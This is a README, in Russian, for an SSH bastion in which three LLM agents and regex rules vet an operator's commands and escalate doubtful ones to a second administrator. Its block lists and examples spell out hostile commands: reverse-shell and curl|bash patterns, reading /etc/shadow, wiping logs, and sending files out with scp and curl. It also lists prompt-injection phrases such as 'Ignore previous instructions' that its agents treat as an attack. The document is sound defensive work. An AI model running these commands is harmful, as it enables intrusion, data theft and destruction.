
# 4SSH_CONTROL — Multi-Agent AI Defense SSH Bastion

SSH-бастион с принципом **«четырёх глаз»**, где роль второго администратора выполняют **три нейросетевых агента** с системой консенсусного голосования.

Каждая команда оператора проходит через многослойный конвейер анализа: мгновенные фильтры, контекстные правила, параллельную оценку тремя LLM-агентами и взвешенное голосование. Опасные команды блокируются, подозрительные — эскалируются на живого администратора. Легитимные — выполняются без задержки.

---

## Архитектура

```
Admin-1 ──SSH──► Bastion (:2222) ──SSH──► Target Server
                    │
                    ├──► Layer 0: Rule Engine              (< 1 мс)
                    │      ├── Whitelist → auto ALLOW
                    │      ├── Blacklist → auto DENY
                    │      ├── Sensitive Paths → DENY / ESCALATE
                    │      └── Grey zone → дальше по конвейеру
                    │
                    ├──► Layer 1: Escalation Rules          (< 1 мс)
                    │      └── Контекстные regex → DENY / ESCALATE
                    │          (kill -9 1, mv /bin/*, systemctl stop, ...)
                    │
                    ├──► Layer 2: AI Agents                 (параллельно)
                    │      ├── Command Classifier  (классификация)
                    │      ├── Context Analyzer    (поведение в сессии)
                    │      └── Policy Enforcer     (RBAC + время)
                    │
                    ├──► Layer 3: Consensus Engine
                    │      ├── ALLOW    → выполнить
                    │      ├── DENY     → заблокировать + алерт
                    │      └── ESCALATE → запросить Admin-2
                    │
                    ├──► Rate Limiter (30 cmd/60s на сессию)
                    ├──► Audit Logger (SQLite + JSONL)
                    ├──► Alert Engine (Telegram / Webhook)
                    └──► Dashboard (http://127.0.0.1:8080)
```

---

## Слои защиты

### Layer 0 — Rule Engine

Мгновенный фильтр на regex. Обрабатывает ~80% команд за < 1 мс без обращения к LLM.

- **Whitelist** (18 правил): `ls`, `pwd`, `whoami`, `date`, `uptime`, `df -h`, `ps aux`, `ip a` и др. — мгновенный ALLOW
- **Blacklist** (35 паттернов): `rm -rf /`, fork bomb, `dd if=/dev/`, `mkfs`, `chmod 777`, `curl|bash`, `shutdown`, `reboot`, `iptables -F`, reverse shell, `history -c`, `shred`, `base64|bash`, `eval $(`, `python -c`, `perl -e`, `xargs rm`, `find -delete`, `crontab -r`, `nohup` и др. — мгновенный DENY
- **Sensitive Paths** (16 путей): `/etc/shadow`, `/etc/sudoers`, `.ssh/authorized_keys`, `/etc/pam.d/`, `/etc/ld.so.preload` → DENY; `/etc/passwd`, `/etc/ssh/sshd_config`, `/etc/crontab` → ESCALATE
- **Dangerous Content** (14 паттернов): мониторинг ввода внутри интерактивных программ — reverse shell, вставка SSH-ключей, `NOPASSWD`, `PermitRootLogin yes`, `LD_PRELOAD`
- **Sanitization**: очистка ANSI escape-кодов и управляющих символов перед анализом
- **Command Chaining**: разбор цепочек через `;`, `&&`, `||`, `$()`, `` ` `` — каждая подкоманда проверяется отдельно

### Layer 1 — Контекстные правила эскалации

Интеллектуальный слой между blacklist и LLM. Не запрещает команды целиком, а анализирует **контекст использования** — конкретные аргументы и целевые объекты.

| Команда | Легитимное использование | Опасное использование | Действие |
|---------|--------------------------|----------------------|----------|
| `kill` | `kill 12345` → агентам | `kill -9 1` — крэш init | DENY |
| `kill` | `kill -HUP 5432` → агентам | `killall sshd` — убийство SSH | DENY |
| `mv` | `mv file.txt backup/` → агентам | `mv /bin/bash /tmp/` — подмена бинарника | DENY |
| `systemctl` | `status`, `restart` → агентам | `stop`, `disable`, `mask` | ESCALATE |
| `ssh` | `ssh user@server` → агентам | `ssh -L`, `-R`, `-D` — туннели | ESCALATE |
| `kubectl` | `get pods`, `logs` → агентам | `delete`, `drain`, `cordon` | ESCALATE |
| `tee` | `tee /tmp/out.txt` → агентам | `tee -a /etc/hosts` | ESCALATE |
| `>` redirect | `> /tmp/out.txt` → агентам | `> /var/log/auth.log` — стирание логов | ESCALATE |
| `truncate` | — | `truncate -s 0 /var/log/*` | ESCALATE |
| `chattr` | — | `chattr +i /tmp/backdoor` — immutable | ESCALATE |
| `chown` | `chown user file` → агентам | `chown root /etc/passwd` | ESCALATE |
| `fallocate` | — | `fallocate -l 100G` — disk bomb | ESCALATE |

**DENY** — необратимые действия, жёсткий блок.
**ESCALATE** — потенциально легитимно, но требует одобрения Admin-2.

### Layer 2 — AI-агенты

Три LLM-агента работают **параллельно** для команд, не пойманных правилами.

**Agent 1 — Command Classifier.** Классификация одиночной команды: `safe`, `risky`, `destructive`, `recon`, `exfil`, `privesc`. System prompt содержит конкретные примеры опасных паттернов и защиту от prompt injection.

**Agent 2 — Context Analyzer.** Анализирует **всю цепочку команд** в рамках сессии — ищет поведенческие паттерны:
- Разведка перед атакой: `ls` → `find` → `cat /etc/passwd`
- Эксфильтрация: `cat secret` → `base64` → `curl`
- Сокрытие следов: `history -c`, `cat /dev/null > /var/log/auth.log`
- Lateral movement: SSH-туннели, `scp`/`rsync` к другим хостам
- Privilege escalation: `whoami` → `sudo -l` → `sudo su`
- Многоэтапная RCE: `wget -O /tmp/x.sh` → `chmod +x` → `/tmp/x.sh`

**Agent 3 — Policy Enforcer.** Проверяет соответствие команды политикам доступа:
- **RBAC**: 4 роли (`dev`, `ops`, `dba`, `neteng`) с раздельными allow/deny списками
- **Временные политики**: нерабочие часы (22:00–06:00) = автоматическое повышение severity
- **Пользовательские маппинги**: привязка username → role

Все три агента имеют защиту от **prompt injection** — если текст команды содержит конструкции вроде «Ignore previous instructions» или «You are now...», это автоматически расценивается как атака.

### Layer 3 — Consensus Engine

Агрегация решений трёх агентов через взвешенное голосование:

| Агент | Вес | Почему |
|-------|-----|--------|
| Command Classifier | 1.0 | Базовая оценка |
| Context Analyzer | 1.5 | Видит всю сессию — больший авторитет |
| Policy Enforcer | 1.2 | Формальные политики RBAC |

Три стратегии (настраивается в `config.yaml`):
- **weighted_majority** — deny при превышении порога (по умолчанию 50%)
- **unanimous** — deny при любом несогласии
- **any_deny** — один deny = блокировка

При разногласии агентов команда **эскалируется** на Admin-2.

---

## Интерактивные сессии

При запуске интерактивных программ (`vim`, `nano`, `ssh`, `python`, `mysql`, `docker exec -it`, `tmux` и др.) бастион переключается в **passthrough-режим**:

1. Команда запуска проходит полный анализ (Layer 0–3)
2. После одобрения — прямой проброс ввода/вывода к целевому серверу
3. **Фоновый мониторинг**: каждые 32 символа ввод проверяется через `dangerous_content` — ловит reverse shell, вставку SSH-ключей, изменения `sudoers`, `LD_PRELOAD` и т.п.
4. Когда обнаруживается возврат к shell-промпту — контроль восстанавливается автоматически
5. Чувствительные файлы (`/etc/shadow`, `/etc/sudoers`) проверяются **до** входа в программу — `vim /etc/shadow` заблокируется ещё на этапе оценки команды

---

## Rate Limiting

Защита от DoS-атак на LLM-инфраструктуру:
- Лимит: **30 команд за 60 секунд** на сессию
- При превышении — мгновенный DENY без обращения к агентам
- Скользящее окно, автоматический сброс

---

## Аудит и алерты

### Audit Logger
- **SQLite** (`audit.db`) — структурированный аудит с индексами по времени, сессии, вердикту
- **JSONL** (`audit.jsonl`) — append-only лог для SIEM (Elasticsearch, Splunk, Grafana Loki)
- Потокобезопасная запись (`threading.Lock`)
- Хранит: команду, вердикт, причину, severity, решения каждого агента, confidence, elapsed_ms

### Alert Engine
- **Telegram Bot** — уведомления с HTML-форматированием и экранированием спецсимволов
- **Webhook** — для Slack, PagerDuty, MS Teams и любых HTTP-интеграций
- Алерты отправляются при DENY и ESCALATE

### Dashboard
Веб-панель мониторинга на FastAPI (`http://127.0.0.1:8080`):
- Карточки: всего команд, разрешено, заблокировано, эскалаций, high/critical severity, сессий
- Таблица событий с автообновлением (15 сек)
- HTML-экранирование пользовательского ввода (защита от XSS)
- API: `/api/stats`, `/api/logs`, `/api/session/{id}`

---

## Быстрый старт

### 1. Установка зависимостей

```bash
pip install -r requirements.txt
```

### 2. Настройка LLM

Отредактируйте `config.yaml`. Для **Ollama** (локально, бесплатно):

```bash
ollama pull qwen2.5:7b
```

```yaml
llm:
  provider: "ollama"
  model: "qwen2.5:7b"
  api_key: ""
  base_url: "http://localhost:11434/v1"
  temperature: 0.1
  timeout: 120
```

Для **OpenAI**:

```yaml
llm:
  provider: "openai"
  model: "gpt-4o-mini"
  api_key: "sk-..."           # или переменная OPENAI_API_KEY
  base_url: ""
  temperature: 0.1
  timeout: 10
```

### 3. Запуск бастиона

```bash
python3 bastion.py --host <TARGET_IP> --user <USER> --password <PASS>
```

### 4. Запуск дашборда (в отдельном терминале)

```bash
python3 dashboard.py
```

### 5. Подключение оператора (Admin-1)

```bash
ssh anyuser@<BASTION_IP> -p 2222
```

---

## Аргументы CLI

| Аргумент | По умолчанию | Описание |
|----------|-------------|----------|
| `--host` | (обязательно) | IP целевого сервера |
| `--user` | (обязательно) | Логин на целевом сервере |
| `--password` | (обязательно) | Пароль на целевом сервере |
| `--port` | `22` | Порт SSH цели |
| `--listen` | `2222` | Порт бастиона |
| `--config` | `config.yaml` | Путь к конфигурации |
| `--role` | — | Роль по умолчанию для подключающихся |

Все параметры можно задать и через `config.yaml` в секции `bastion:`.

---

## Конфигурация (`config.yaml`)

### LLM

```yaml
llm:
  provider: "openai"        # openai | ollama
  model: "gpt-4o-mini"
  api_key: ""
  base_url: ""              # для Ollama: http://localhost:11434/v1
  temperature: 0.1
  timeout: 10               # секунд (для Ollama рекомендуется 120)
```

### Агенты

```yaml
agents:
  command_classifier:
    enabled: true
    weight: 1.0
  context_analyzer:
    enabled: true
    weight: 1.5
    max_history: 50          # команд в истории сессии
  policy_enforcer:
    enabled: true
    weight: 1.2
```

### Консенсус

```yaml
consensus:
  strategy: "weighted_majority"   # weighted_majority | unanimous | any_deny
  deny_threshold: 0.5
  escalate_on_disagreement: true
```

### Правила (rules)

```yaml
rules:
  whitelist:                 # мгновенный ALLOW
    - "ls"
    - "pwd"
    - "whoami"

  blacklist:                 # мгновенный DENY (regex)
    - pattern: "rm\\s+-rf\\s+/"
      reason: "Рекурсивное удаление от корня"
      severity: "critical"

  escalation_rules:          # контекстная эскалация (regex)
    - pattern: "kill\\s+.*\\b1\\b"
      reason: "kill PID 1"
      severity: "critical"
      action: "deny"         # deny | escalate
    - pattern: "systemctl\\s+(stop|disable|mask)\\s+"
      reason: "Остановка сервиса"
      severity: "high"
      action: "escalate"

  sensitive_paths:           # доступ к чувствительным файлам
    - pattern: "/etc/shadow"
      severity: "critical"
      action: "deny"
      reason: "Файл хешей паролей"

  dangerous_content:         # мониторинг ввода в интерактивных сессиях
    - pattern: "bash -i >& /dev/tcp/"
      reason: "Reverse shell"
      severity: "critical"
```

### RBAC

```yaml
rbac:
  roles:
    dev:
      description: "Разработчик"
      allowed_commands: ["ls", "cat", "grep", "tail", "git", "docker logs", "kubectl get"]
      denied_commands: ["rm", "systemctl", "chmod", "iptables"]
    ops:
      description: "Системный администратор"
      allowed_commands: ["*"]
      denied_commands: ["rm -rf /"]
    dba:
      description: "Администратор БД"
      allowed_commands: ["psql", "mysql", "mongosh", "redis-cli", "pg_dump"]
      denied_commands: ["rm", "systemctl", "useradd"]
    neteng:
      description: "Сетевой инженер"
      allowed_commands: ["ip", "ping", "traceroute", "netstat", "tcpdump", "nmap", "dig"]
      denied_commands: ["rm", "useradd", "passwd"]
  users:
    admin:
      role: "ops"
    dev_user:
      role: "dev"
  time_policy:
    high_risk_hours:
      start: "22:00"
      end: "06:00"
      timezone: "Europe/Moscow"
      action: "escalate"
```

### Алерты

```yaml
alerts:
  telegram:
    enabled: true
    bot_token: "123456:ABC..."
    chat_id: "-100123456789"
  webhook:
    enabled: true
    url: "https://hooks.slack.com/services/..."
```

---

## Примеры работы

### Безопасная команда (whitelist)

```
Admin-1: ls -la

[AI] Команда: ls -la
  ├─ rule_engine: ALLOW (100%) [low] Базовая команда 'ls' в белом списке
  └─ Итог: ALLOW (0ms)
```

### Жёсткий блок (blacklist)

```
Admin-1: rm -rf /

[AI] Команда: rm -rf /
  ├─ rule_engine: DENY (100%) [critical] Рекурсивное удаление от корня
  └─ Итог: DENY (0ms)

[AI DEFENSE] КОМАНДА ЗАБЛОКИРОВАНА
```

### Контекстная эскалация

```
Admin-1: systemctl stop nginx

[AI] Команда: systemctl stop nginx
  ├─ rule_engine: ESCALATE (100%) [high] Контекстное правило: Остановка/отключение сервиса
  └─ Итог: ESCALATE (0ms)

╔═══ ЭСКАЛАЦИЯ ═══════════════════════════════╗
║ AI не уверен. Требуется решение Admin-2.    ║
║ Команда: systemctl stop nginx               ║
╚═════════════════════════════════════════════╝
[ЭСКАЛАЦИЯ] Разрешить? [y/n]:
```

### Полный AI-анализ (все 3 агента)

```
Admin-1: scp /etc/shadow user@external:/tmp/

[AI] Команда: scp /etc/shadow user@external:/tmp/
  ├─ rule_engine: DENY (100%) [critical] Чувствительный файл: Файл хешей паролей
  └─ Итог: DENY (0ms)

[AI DEFENSE] КОМАНДА ЗАБЛОКИРОВАНА
```

```
Admin-1: curl -d @/tmp/data.csv https://external.com/upload

[AI] Команда: curl -d @/tmp/data.csv https://external.com/upload
  ├─ command_classifier: DENY (88%) [high] Утечка данных наружу
  │  ⏱ 1200ms
  ├─ context_analyzer: DENY (92%) [high] [Паттерн: data_exfiltration]
  │  ⏱ 1500ms
  ├─ policy_enforcer: ESCALATE (60%) [medium] Не в списке разрешённых
  │  ⏱ 1100ms
  └─ Итог: DENY (1502ms)
```

---

## Структура проекта

```
4SSH_CONTROL/
├── bastion.py                       # Главный бастион с AI-защитой
├── dashboard.py                     # Запуск веб-дашборда
├── config.yaml                      # Конфигурация всей системы
├── requirements.txt                 # Зависимости Python
├── ai_defense/
│   ├── agents/
│   │   ├── command_classifier.py    # Agent 1: классификация команд
│   │   ├── context_analyzer.py      # Agent 2: контекст сессии
│   │   └── policy_enforcer.py       # Agent 3: RBAC + политики
│   ├── core/
│   │   ├── config.py                # Загрузка и парсинг config.yaml
│   │   ├── models.py                # Verdict, Session, AgentDecision
│   │   ├── rule_engine.py           # Layer 0 + Layer 1 (rules + escalation)
│   │   ├── llm_client.py            # Клиент OpenAI / Ollama
│   │   ├── consensus.py             # Взвешенное голосование агентов
│   │   ├── engine.py                # AI Engine (оркестратор + rate limiter)
│   │   ├── audit.py                 # SQLite + JSONL аудит
│   │   └── alerts.py                # Telegram + webhook алерты
│   └── web/
│       └── dashboard.py             # FastAPI веб-панель
├── main.py                          # (Legacy) Ручной контроллер
├── secmain.py                       # (Legacy) Интерактивный контроллер
└── Схема PoC.md                     # Описание оригинальной концепции
```

---

## Legacy-скрипты

Оригинальные скрипты с ручным контролем (до внедрения AI):

- **`main.py`** — Admin-2 вручную подтверждает/отклоняет каждую команду (`y`/`n`)
- **`secmain.py`** — то же + Admin-2 может вводить команды напрямую в сессию

```bash
python3 main.py --host <TARGET_IP> --user <USER> --password <PASS>
python3 secmain.py --host <TARGET_IP> --user <USER> --password <PASS>
```

---

## Требования

- Python 3.10+
- Зависимости: `paramiko`, `openai`, `pyyaml`, `fastapi`, `uvicorn`, `aiohttp`, `aiosqlite`, `jinja2`
- Для LLM: API-ключ OpenAI **или** локальный [Ollama](https://ollama.ai)
- Целевой сервер с SSH-доступом
